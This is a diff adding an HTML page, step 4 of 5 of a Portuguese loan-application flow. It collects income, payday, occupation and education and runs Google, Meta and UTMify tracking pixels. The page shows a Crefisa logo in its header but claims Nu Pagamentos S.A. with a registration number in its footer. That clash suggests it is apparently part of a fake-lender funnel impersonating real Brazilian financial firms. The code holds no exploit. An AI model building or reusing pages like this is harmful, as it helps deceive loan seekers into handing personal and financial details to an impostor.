@@ -1,0 +1,684 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5HHS3G78');</script>
+<!-- End Google Tag Manager -->
+
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Informações do Empréstimo — Quase Lá!</title>
+  <style>
+    .navbar {
+      background-color: #9903d6;
+      padding: 15px 5%;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      z-index: 1000;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 10px rgba(153, 3, 214, 0.2);
+    }
+    
+    footer {
+      background-color: #9903d6;
+      color: #fff;
+      padding: 20px 0;
+      text-align: center;
+      position: relative;
+      bottom: 0;
+      width: 100%;
+      font-size: 14px;
+    }
+
+    :root {
+      --purple: #9903d6;
+      --purple-light: #b347e8;
+      --purple-dark: #7a02a8;
+      --bg: #f8f9fa;
+      --card: #fff;
+      --muted: #6b7280;
+      --success: #16a34a;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --radius: 16px;
+      --shadow: 0 4px 20px rgba(153, 3, 214, 0.08);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: #1f2937;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      min-height: 100vh;
+      padding-top: 80px;
+      line-height: 1.6;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 24px;
+      margin-bottom: 20px;
+      border: 1px solid rgba(153, 3, 214, 0.08);
+    }
+
+    .progress-bar {
+      background: #e5e7eb;
+      border-radius: 10px;
+      height: 8px;
+      margin-bottom: 24px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      background: linear-gradient(90deg, var(--purple), var(--purple-light));
+      height: 100%;
+      width: 80%;
+      border-radius: 10px;
+      transition: width 0.3s ease;
+    }
+
+    .header-section {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin: 0 0 8px;
+      color: #111827;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 0.95rem;
+      margin: 0;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      display: block;
+      color: #374151;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      padding-left: 4px;
+    }
+
+    .form-select {
+      width: 100%;
+      padding: 16px;
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      font-size: 16px;
+      background: #fff;
+      color: #374151;
+      transition: all 0.2s ease;
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e");
+      background-position: right 12px center;
+      background-repeat: no-repeat;
+      background-size: 16px;
+      cursor: pointer;
+    }
+
+    .form-select:focus {
+      outline: none;
+      border-color: var(--purple);
+      box-shadow: 0 0 0 3px rgba(153, 3, 214, 0.1);
+      transform: translateY(-1px);
+    }
+
+    .form-select:hover {
+      border-color: var(--purple-light);
+    }
+
+    .form-select option {
+      padding: 12px;
+      font-size: 16px;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, var(--purple), var(--purple-light));
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 24px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-submit:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(153, 3, 214, 0.3);
+    }
+
+    .btn-submit:active {
+      transform: translateY(0);
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .btn-submit .loading {
+      display: none;
+    }
+
+    .btn-submit.loading .loading {
+      display: inline-block;
+      margin-right: 8px;
+    }
+
+    .btn-submit.loading .text {
+      display: none;
+    }
+
+    /* Validation styles */
+    .form-select.error {
+      border-color: var(--danger);
+      box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
+    }
+
+    .form-select.success {
+      border-color: var(--success);
+      box-shadow: 0 0 0 3px rgba(22, 163, 74, 0.1);
+    }
+
+    .error-message {
+      color: var(--danger);
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+
+    .success-message {
+      color: var(--success);
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+
+    /* Animations */
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .form-group {
+      animation: slideIn 0.4s ease-out;
+    }
+
+    .form-group:nth-child(2) { animation-delay: 0.1s; }
+    .form-group:nth-child(3) { animation-delay: 0.2s; }
+    .form-group:nth-child(4) { animation-delay: 0.3s; }
+    .form-group:nth-child(5) { animation-delay: 0.4s; }
+
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid transparent;
+      border-top: 2px solid currentColor;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    /* Success feedback */
+    .success-feedback {
+      background: linear-gradient(135deg, #dcfce7, #bbf7d0);
+      border: 2px solid var(--success);
+      color: #166534;
+      padding: 16px;
+      border-radius: 12px;
+      text-align: center;
+      font-weight: 600;
+      margin: 16px 0;
+      display: none;
+      animation: slideIn 0.4s ease-out;
+    }
+
+    /* Mobile optimizations */
+    @media (max-width: 480px) {
+      .container {
+        padding: 16px;
+      }
+      
+      .card {
+        padding: 20px;
+        margin-bottom: 16px;
+      }
+      
+      h1 {
+        font-size: 1.35rem;
+      }
+      
+      .form-select {
+        padding: 14px;
+        font-size: 16px; /* Prevents zoom on iOS */
+      }
+      
+      .btn-submit {
+        padding: 16px;
+        font-size: 16px;
+      }
+    }
+
+    /* Focus improvements for accessibility */
+    .form-select:focus-visible {
+      outline: 2px solid var(--purple);
+      outline-offset: 2px;
+    }
+
+    /* Smooth transitions for all interactive elements */
+    .form-select,
+    .btn-submit {
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* Enhanced visual feedback */
+    .form-group.completed .form-select {
+      border-color: var(--success);
+      background-color: #f0fdf4;
+    }
+
+    .form-group.completed .form-label::after {
+      content: " ✓";
+      color: var(--success);
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <div>
+      <img src="images/crefisa.png" alt="Logo" style="height: 35px;">
+    </div>
+    <div>
+      <span style="color: white; font-size: 14px; font-weight: 500;">Passo 4 de 5</span>
+    </div>
+  </nav>
+
+  <div class="container">
+    <div class="card">
+      <div class="progress-bar">
+        <div class="progress-fill"></div>
+      </div>
+
+      <div class="header-section">
+        <h1>Quase lá! 🎯</h1>
+        <p class="subtitle">Precisamos de algumas informações para finalizar sua proposta de empréstimo</p>
+      </div>
+
+      <form id="loanForm" action="../5/">
+        <div class="form-group">
+          <label class="form-label" for="income">Qual sua renda mensal aproximada?</label>
+          <select class="form-select" id="income" name="income" required="">
+            <option value="" disabled="" selected="">Selecione sua faixa de renda</option>
+            <option value="500">R$ 500,00</option>
+            <option value="1000">R$ 1.000,00</option>
+            <option value="1500">R$ 1.500,00</option>
+            <option value="2000">R$ 2.000,00</option>
+            <option value="2500">R$ 2.500,00</option>
+            <option value="3000">R$ 3.000,00</option>
+            <option value="3500">R$ 3.500,00</option>
+            <option value="4000">R$ 4.000,00</option>
+            <option value="4500">R$ 4.500,00</option>
+            <option value="5000">R$ 5.000,00 ou mais</option>
+          </select>
+          <div class="error-message">Por favor, selecione sua faixa de renda</div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="salaryDay">Qual dia do mês você recebe?</label>
+          <select class="form-select" id="salaryDay" name="salaryDay" required="">
+            <option value="" disabled="" selected="">Selecione o dia</option>
+            <option value="1">Dia 1</option>
+            <option value="2">Dia 2</option>
+            <option value="3">Dia 3</option>
+            <option value="4">Dia 4</option>
+            <option value="5">Dia 5</option>
+            <option value="6">Dia 6</option>
+            <option value="7">Dia 7</option>
+            <option value="8">Dia 8</option>
+            <option value="9">Dia 9</option>
+            <option value="10">Dia 10</option>
+            <option value="11">Dia 11</option>
+            <option value="12">Dia 12</option>
+            <option value="13">Dia 13</option>
+            <option value="14">Dia 14</option>
+            <option value="15">Dia 15</option>
+            <option value="16">Dia 16</option>
+            <option value="17">Dia 17</option>
+            <option value="18">Dia 18</option>
+            <option value="19">Dia 19</option>
+            <option value="20">Dia 20</option>
+            <option value="21">Dia 21</option>
+            <option value="22">Dia 22</option>
+            <option value="23">Dia 23</option>
+            <option value="24">Dia 24</option>
+            <option value="25">Dia 25</option>
+            <option value="26">Dia 26</option>
+            <option value="27">Dia 27</option>
+            <option value="28">Dia 28</option>
+            <option value="29">Dia 29</option>
+            <option value="30">Dia 30</option>
+          </select>
+          <div class="error-message">Por favor, selecione o dia que você recebe</div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="occupation">Ocupação</label>
+          <select class="form-select" id="occupation" name="occupation" required="">
+            <option value="" disabled="" selected="">Selecione sua ocupação</option>
+            <option value="Empresário">👔 Empresário</option>
+            <option value="Dona de casa">🏠 Dona de casa</option>
+            <option value="Empregado CLT">💼 Empregado CLT</option>
+            <option value="Autônomo">🔧 Autônomo</option>
+            <option value="Funcionário público">🏛️ Funcionário público</option>
+            <option value="Rentista">💰 Rentista</option>
+            <option value="Aposentado/Pensionista">👴 Aposentado/Pensionista</option>
+            <option value="Estudante">📚 Estudante</option>
+            <option value="Desempregado">🔍 Desempregado</option>
+            <option value="Outro">➕ Outro</option>
+          </select>
+          <div class="error-message">Por favor, selecione sua ocupação</div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="education">Escolaridade</label>
+          <select class="form-select" id="education" name="education" required="">
+            <option value="" disabled="" selected="">Selecione sua escolaridade</option>
+            <option value="Fundamental">📖 Ensino Fundamental</option>
+            <option value="Médio">🎓 Ensino Médio</option>
+            <option value="Superior">🎓 Ensino Superior</option>
+            <option value="Pós-Graduação">👨‍🎓 Pós-Graduação</option>
+            <option value="Outro">➕ Outro</option>
+          </select>
+          <div class="error-message">Por favor, selecione sua escolaridade</div>
+        </div>
+
+        <div class="success-feedback" id="successFeedback">
+          ✅ Informações validadas! Redirecionando para a próxima etapa...
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitBtn">
+          <div class="loading">
+            <div class="spinner"></div>
+          </div>
+          <span class="text">Continuar para Próxima Etapa</span>
+        </button>
+
+        <!-- Hidden fields for tracking -->
+        <input type="hidden" name="utm_source" value="organic">
+        <input type="hidden" name="utm_campaign" value="loan-form">
+        <input type="hidden" name="utm_medium" value="">
+        <input type="hidden" name="utm_content" value="">
+        <input type="hidden" name="utm_term" value="">
+      </form>
+    </div>
+  </div>
+
+  <footer>
+    <div style="text-align: center;">
+      <img src="images/logo.png" alt="Logo" style="width: 70px; margin-bottom: 8px;">
+      <p style="margin: 0; font-size: 14px; line-height: 1.5;">© 2025 Nu Pagamentos S.A</p>
+      <p style="margin: 0; font-size: 14px; line-height: 1.5;">18.236.120/0001-58 - São Paulo, SP - 05409-000</p>
+    </div>
+  </footer>
+
+  <script>
+    // Enhanced form validation and UX
+    const form = document.getElementById('loanForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const successFeedback = document.getElementById('successFeedback');
+    const selects = form.querySelectorAll('.form-select');
+    
+    let completedFields = 0;
+    const totalFields = selects.length;
+
+    // Real-time validation and progress tracking
+    selects.forEach((select, index) => {
+      select.addEventListener('change', function() {
+        validateField(this);
+        updateProgress();
+        
+        // Add completion animation
+        const formGroup = this.closest('.form-group');
+        if (this.value) {
+          formGroup.classList.add('completed');
+          
+          // Smooth scroll to next field on mobile
+          if (window.innerWidth <= 768 && index < selects.length - 1) {
+            setTimeout(() => {
+              selects[index + 1].scrollIntoView({ 
+                behavior: 'smooth', 
+                block: 'center' 
+              });
+              selects[index + 1].focus();
+            }, 300);
+          }
+        } else {
+          formGroup.classList.remove('completed');
+        }
+      });
+
+      // Enhanced focus states
+      select.addEventListener('focus', function() {
+        this.closest('.form-group').style.transform = 'scale(1.02)';
+        this.closest('.form-group').style.transition = 'transform 0.2s ease';
+      });
+
+      select.addEventListener('blur', function() {
+        this.closest('.form-group').style.transform = 'scale(1)';
+      });
+    });
+
+    function validateField(field) {
+      const formGroup = field.closest('.form-group');
+      const errorMsg = formGroup.querySelector('.error-message');
+      
+      if (field.value) {
+        field.classList.remove('error');
+        field.classList.add('success');
+        errorMsg.style.display = 'none';
+        return true;
+      } else {
+        field.classList.add('error');
+        field.classList.remove('success');
+        errorMsg.style.display = 'block';
+        return false;
+      }
+    }
+
+    function updateProgress() {
+      completedFields = Array.from(selects).filter(select => select.value).length;
+      const progressPercent = (completedFields / totalFields) * 100;
+      
+      document.querySelector('.progress-fill').style.width = `${Math.max(progressPercent, 20)}%`;
+      
+      // Update navbar step indicator
+      const stepIndicator = document.querySelector('.navbar span');
+      if (completedFields === totalFields) {
+        stepIndicator.textContent = 'Pronto para enviar!';
+        stepIndicator.style.color = '#16a34a';
+      }
+    }
+
+    // Enhanced form submission
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      let isValid = true;
+      selects.forEach(select => {
+        if (!validateField(select)) {
+          isValid = false;
+        }
+      });
+
+      if (!isValid) {
+        // Scroll to first error
+        const firstError = form.querySelector('.form-select.error');
+        if (firstError) {
+          firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          firstError.focus();
+        }
+        return;
+      }
+
+      // Show loading state
+      submitBtn.classList.add('loading');
+      submitBtn.disabled = true;
+
+      // Simulate processing time for better UX
+      setTimeout(() => {
+        // Show success feedback
+        successFeedback.style.display = 'block';
+        successFeedback.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        
+        // Update progress to 100%
+        document.querySelector('.progress-fill').style.width = '100%';
+        
+        setTimeout(() => {
+          // Submit the form
+          form.submit();
+        }, 1500);
+      }, 800);
+    });
+
+    // Auto-save form data to localStorage
+    selects.forEach(select => {
+      // Load saved data
+      const savedValue = localStorage.getItem(`loan_form_${select.name}`);
+      if (savedValue) {
+        select.value = savedValue;
+        validateField(select);
+        select.closest('.form-group').classList.add('completed');
+      }
+
+      // Save data on change
+      select.addEventListener('change', function() {
+        localStorage.setItem(`loan_form_${this.name}`, this.value);
+      });
+    });
+
+    // Initialize progress on page load
+    updateProgress();
+
+    // Accessibility improvements
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && e.target.tagName === 'SELECT') {
+        e.target.click();
+      }
+    });
+
+    // Prevent form loss on page refresh
+    window.addEventListener('beforeunload', function(e) {
+      const hasUnsavedData = Array.from(selects).some(select => select.value);
+      if (hasUnsavedData && completedFields < totalFields) {
+        e.preventDefault();
+        e.returnValue = '';
+      }
+    });
+
+    // Mobile-specific enhancements
+    if (window.innerWidth <= 768) {
+      // Prevent zoom on select focus (iOS)
+      selects.forEach(select => {
+        select.addEventListener('focus', function() {
+          document.querySelector('meta[name=viewport]').setAttribute(
+            'content', 
+            'width=device-width, initial-scale=1, maximum-scale=1'
+          );
+        });
+        
+        select.addEventListener('blur', function() {
+          document.querySelector('meta[name=viewport]').setAttribute(
+            'content', 
+            'width=device-width, initial-scale=1'
+          );
+        });
+      });
+    }
+  </script>
+  <!-- Pixel Meta + UTMify com deduplicação -->
+<script>
+  // Gera um eventID único para deduplicação
+  const eventId = 'page-' + Date.now();
+
+  // --- Meta Pixel ---
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+  
+  fbq('init', '1607974976562499');
+  fbq('track', 'PageView', {}, {eventID: eventId});
+
+  // --- UTMify Pixel ---
+  window.pixelId = "684c7d3bb21e8e0cccb36251";
+  window.eventID = eventId; // mesmo ID para deduplicação
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1607974976562499&ev=PageView&noscript=1"/>
+</noscript>
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5HHS3G78"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+</body></html>
